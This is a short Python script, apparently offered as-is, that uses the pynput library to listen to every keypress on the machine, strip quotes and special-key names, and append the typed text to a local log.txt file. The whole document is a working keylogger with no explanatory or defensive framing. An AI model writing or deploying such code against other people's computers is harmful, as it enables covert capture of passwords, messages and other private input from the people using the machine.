from pynput.keyboard import Listener

logFile = 'log.txt'

def writeLog(key):

    translate_keys = {
        "Key.space":" ",
        "Key.shift_r":"",
        "Key.shift_l":"",
        "Key.enter":"\n",
        "Key.alt":"",
        "Key.esc":"",
        "Key.cmd":"",
        "tabKey":"",
        "Key.tab":"",
        "Key.caps_lock":"",

    }

    key_data = str(key)

    key_data = key_data.replace("'", "")

    for key in translate_keys:
        key_data = key_data.replace(key, translate_keys[key])

    with open(logFile, "a") as f:
        f.write(key_data)

with Listener(on_press=writeLog) as l:
    l.join()